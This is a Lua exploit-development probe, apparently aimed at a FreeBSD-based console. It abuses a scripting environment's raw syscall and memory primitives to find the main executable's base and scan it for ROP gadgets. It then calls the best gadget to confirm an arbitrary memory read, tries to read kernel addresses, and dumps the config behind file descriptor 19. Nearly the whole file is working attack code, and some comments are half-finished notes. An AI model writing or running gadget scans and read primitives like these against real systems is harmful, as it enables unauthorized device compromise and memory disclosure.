-- CRASH_CLASS: LOW
-- PROBE 118b: FAST eboot gadget scan using dword reads
--
-- Previous 118a timed out doing byte-by-byte reads.
-- This version reads dwords at 4-byte stride (no pcall — eboot is RX).
-- Pattern matching: check each dword against known LE encodings.
--
-- Key targets:
--   48 8B 07 C3 → LE dword 0xC3078B48 = mov rax,[rdi]; ret
--   48 8B 06 C3 → LE dword 0xC3068B48 = mov rax,[rsi]; ret
--   8B 07 C3 xx → low 3 bytes 0xC3078B  = mov eax,[rdi]; ret (+ any 4th byte)
--   8B 06 C3 xx → low 3 bytes 0xC3068B  = mov eax,[rsi]; ret (+ any 4th byte)

print("=== PROBE 118b: FAST GADGET SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
print(string.format("eboot: 0x%X%08X",ehi,elo))
local EB = N(uint64(string.format("0x%X%08X",ehi,elo)))

-- Target dword values (LE encoding of byte patterns)
-- 48 8B 07 C3 = mov rax,[rdi]; ret
-- In memory (LE): addr+0=0x48, addr+1=0x8B, addr+2=0x07, addr+3=0xC3
-- As dword at addr: 0x48 | (0x8B<<8) | (0x07<<16) | (0xC3<<24)
-- = 0x48 + 0x8B00 + 0x70000 + 0xC3000000
-- = 0xC3078B48
-- But Lua read_dword returns signed if >0x7FFFFFFF
-- 0xC3078B48 > 0x7FFFFFFF → signed = 0xC3078B48 - 0x100000000 = -1023438904

local T_MOV_RAX_RDI = -1023438904   -- 0xC3078B48 signed
local T_MOV_RAX_RSI = -1023438904 + 0x100  -- wait let me recalc

-- Actually let me compute properly
-- 48 8B 07 C3: 0xC3078B48 unsigned = 3271528392
-- signed: 3271528392 - 4294967296 = -1023438904
-- 48 8B 06 C3: 0xC3068B48 unsigned = 3271462728
-- signed: 3271462728 - 4294967296 = -1023504568

-- For 3-byte patterns (eax versions), check (dword % 16777216):
-- 8B 07 C3 → 0x8B + 0x0700 + 0xC30000 = 0xC3078B = 12781451
-- 8B 06 C3 → 0x8B + 0x0600 + 0xC30000 = 0xC3068B = 12781195

-- NOTE: with to_num, signed -1023438904 will be that exact number.
-- We need to compare against BOTH the raw return and potential unsigned value.

-- Let's use a flexible approach: convert to unsigned for comparison
local function to_unsigned(v)
    if v < 0 then return v + 4294967296 end
    return v
end

local targets = {
    {val=0xC3078B48, name="mov rax,[rdi];ret", exact=true},
    {val=0xC3068B48, name="mov rax,[rsi];ret", exact=true},
    {val=0xC3078B,   name="mov eax,[rdi];ret", exact=false},
    {val=0xC3068B,   name="mov eax,[rsi];ret", exact=false},
}

-- Also search for read-with-offset gadgets:
-- 48 8B 47 08 C3 = mov rax,[rdi+8]; ret (5 bytes, spans 2 dwords)
-- We'll check the first dword of these (48 8B 47 08 → 0x08478B48)
-- and verify the next byte is C3
local offset_first_dwords = {}
for disp=0x08,0x30,0x08 do
    local dw = 0x48 + 0x8B*256 + 0x47*65536 + disp*16777216
    -- unsigned: 0x48 + 0x8B00 + 0x470000 + disp*0x1000000
    offset_first_dwords[dw] = string.format("mov rax,[rdi+0x%X];ret", disp)
end

local scan_size = 0x200000  -- 2MB (first half of 4.6MB eboot)
local scan_dwords = scan_size / 4
local found = {}

print(string.format("scanning %d dwords (%dKB)...", scan_dwords, scan_size/1024))

local prev_dw = 0

for i=0,scan_dwords-1 do
    -- Direct read without pcall (eboot .text is RX, guaranteed readable)
    local raw = memory.read_dword(EB + i*4)
    local v = N(raw)
    local uv = to_unsigned(v)

    -- Check exact 4-byte patterns
    for _, t in ipairs(targets) do
        if t.exact then
            if uv == t.val then
                local off = i*4
                table.insert(found, {name=t.name, offset=off})
                print(string.format("  FOUND: %s at eboot+0x%X", t.name, off))
            end
        else
            -- 3-byte pattern: check low 24 bits
            if (uv % 16777216) == t.val then
                local off = i*4
                table.insert(found, {name=t.name, offset=off})
                print(string.format("  FOUND: %s at eboot+0x%X", t.name, off))
            end
        end
    end

    -- Check offset gadgets (5-byte spanning 2 dwords)
    local name = offset_first_dwords[uv]
    if name then
        -- Check if next byte (first byte of next dword) is 0xC3 (ret)
        if i < scan_dwords-1 then
            local next_raw = memory.read_dword(EB + (i+1)*4)
            local next_v = to_unsigned(N(next_raw))
            if (next_v % 256) == 0xC3 then
                local off = i*4
                table.insert(found, {name=name, offset=off})
                print(string.format("  FOUND: %s at eboot+0x%X", name, off))
            end
        end
    end

    -- Also check: first byte of this dword is C3 and last 3 bytes of prev
    -- matched 48 8B 07 → forms 48 8B 07 C3 at offset (i*4)-3
    -- prev dword at offset (i-1)*4, its bytes: [b0 b1 b2 b3]
    -- This dword at offset i*4, its bytes: [C3 ...]
    -- So byte sequence: prev[b1] prev[b2] prev[b3] this[b0] = 48 8B 07 C3
    -- prev_dw bytes: b3=prev>>24, b2=(prev>>16)&0xFF, b1=(prev>>8)&0xFF
    -- this_dw byte0: uv & 0xFF
    if (uv % 256) == 0xC3 and i > 0 then
        local puv = to_unsigned(prev_dw)
        -- Check at offset (i*4)-3: bytes are puv[1], puv[2], puv[3], uv[0]
        local b1 = math.floor(puv/256) % 256
        local b2 = math.floor(puv/65536) % 256
        local b3 = math.floor(puv/16777216)
        if b1==0x48 and b2==0x8B and b3==0x07 then
            local off = i*4 - 3
            table.insert(found, {name="mov rax,[rdi];ret @+1", offset=off})
            print(string.format("  FOUND: mov rax,[rdi];ret at eboot+0x%X (unaligned+1)", off))
        end
        if b1==0x48 and b2==0x8B and b3==0x06 then
            local off = i*4 - 3
            table.insert(found, {name="mov rax,[rsi];ret @+1", offset=off})
            print(string.format("  FOUND: mov rax,[rsi];ret at eboot+0x%X (unaligned+1)", off))
        end

        -- At offset (i*4)-1: prev[3] this[0] → only 2 bytes, skip
        -- At offset (i*4)-2: prev[2] prev[3] this[0] this[1] → 4 bytes but need 48 8B 07 C3
        local b2p = math.floor(puv/65536) % 256
        local b3p = math.floor(puv/16777216)
        local b0t = uv % 256
        local b1t = math.floor(uv/256) % 256
        -- combined: b2p, b3p, b0t, b1t
        -- No, I need the sequence 48 8B 07 C3 at these positions
    end

    prev_dw = v

    -- Progress every 128KB (32768 dwords)
    if i % 32768 == 0 and i > 0 then
        print(string.format("  ...at +0x%X (%d found)", i*4, #found))
    end
end

print(string.format("scan complete: %d gadgets found in %dKB", #found, scan_size/1024))

-- ============================================================
print("")
print("--- EXTEND to 2MB-4MB if few found ---")
if #found < 3 then
    print("  scanning second half 2MB-4MB...")
    local scan2_start = scan_size / 4
    local scan2_end = 0x400000 / 4  -- 4MB total
    for i=scan2_start,scan2_end-1 do
        local raw = memory.read_dword(EB + i*4)
        local v = N(raw)
        local uv = to_unsigned(v)
        for _, t in ipairs(targets) do
            if t.exact then
                if uv == t.val then
                    local off = i*4
                    table.insert(found, {name=t.name, offset=off})
                    print(string.format("  FOUND: %s at eboot+0x%X", t.name, off))
                end
            else
                if (uv % 16777216) == t.val then
                    local off = i*4
                    table.insert(found, {name=t.name, offset=off})
                    print(string.format("  FOUND: %s at eboot+0x%X", t.name, off))
                end
            end
        end
        if i % 32768 == 0 then
            print(string.format("  ...at +0x%X (%d found)", i*4, #found))
        end
    end
    print(string.format("  extended scan done, total: %d", #found))
end

-- ============================================================
print("")
print("--- TEST BEST GADGET ---")
if #found > 0 then
    -- Prefer mov rax,[rdi];ret
    local best = found[1]
    for _, g in ipairs(found) do
        if g.name == "mov rax,[rdi];ret" then best = g; break end
    end

    print(string.format("testing: %s at eboot+0x%X", best.name, best.offset))
    local ga = EB + best.offset

    -- Test 1: read eboot base (should be ELF magic 0x464C457F)
    local ok1, r1 = pcall(function()
        return native.fcall_with_rax(ga, 0, EB, 0)
    end)
    if ok1 then
        local v = N(r1)
        local uv = to_unsigned(v)
        print(string.format("  read(eboot+0): 0x%X", uv))
        if uv == 0x464C457F or (uv % 0x100000000) == 0x464C457F then
            print("  *** ELF MAGIC MATCH — ARBITRARY READ WORKS! ***")
        end
    else
        print("  read(eboot+0): CRASHED")
    end

    -- Test 2: read a known buffer value
    local tbuf = memory.alloc(16)
    wq(tbuf, uint64(0xDEADBEEFCAFE1234))
    local ok2, r2 = pcall(function()
        return native.fcall_with_rax(ga, 0, N(tbuf), 0)
    end)
    if ok2 then
        print(string.format("  read(test_buf): %s (expect 0xDEADBEEFCAFE1234)", fmt_ptr(r2)))
    else
        print("  read(test_buf): CRASHED")
    end

    -- Test 3: if read works, try kernel VA (will fault but worth confirming)
    -- DO NOT try this if above tests failed
    if ok1 and ok2 then
        print("")
        print("  attempting kernel VA read (will likely fault/return nil)...")
        -- Use pcall to catch the fault
        local kbase = uint64("0xFFFFFFFF80200000")  -- common FreeBSD kernel base
        local ok3, r3 = pcall(function()
            return native.fcall_with_rax(ga, 0, N(kbase), 0)
        end)
        if ok3 then
            print(string.format("  read(0xFFFFFFFF80200000): %s *** KERNEL READ?! ***", fmt_ptr(r3)))
        else
            print("  read(kernel VA): faulted (expected — kernel pages not mapped in userland)")
        end
    end
else
    print("  no gadgets found")
end

-- ============================================================
print("")
print("--- FD 19 CONFIG DUMP ---")
local sc_mmap = mk(477)
local ok19, addr19 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(1),
        uint64(1), uint64(19), uint64(0))
end)
if ok19 and addr19 then
    local h,l = get_hi_lo(addr19)
    if h<0 then h=h+0x100000000 end
    if h~=0xFFFFFFFF then
        local MA = N(addr19)
        local text = ""
        for i=0,0x1FFF do
            local ok_b, bv = pcall(function() return memory.read_byte(MA+i) end)
            if not ok_b then break end
            local b = N(bv)
            if b==0 then break end
            text = text .. string.char(b)
        end
        print("fd 19 (" .. #text .. " bytes):")
        print(text)
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 118b COMPLETE ===")
